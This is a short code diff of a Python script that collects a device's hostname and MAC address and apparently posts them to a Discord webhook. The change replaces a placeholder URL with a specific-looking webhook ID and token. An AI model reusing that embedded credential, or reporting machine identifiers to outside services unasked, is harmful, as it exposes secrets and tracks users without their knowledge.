@@ -4,7 +4,7 @@ import socket
 import uuid
 
 # Replace this with the URL for your Discord webhook
-WEBHOOK_URL = 'https://discord.com/api/webhooks/1234567890/abcdefg'
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1087174333878780034/YoozAlgUB50HZ6X5iD5lJUnZjpvjqnVBYRqZ3Uz3Oy-P0tP0b_11WP_IxnvjzSXRuIyv'
 
 # Get the device name and MAC address
 device_name = socket.gethostname()
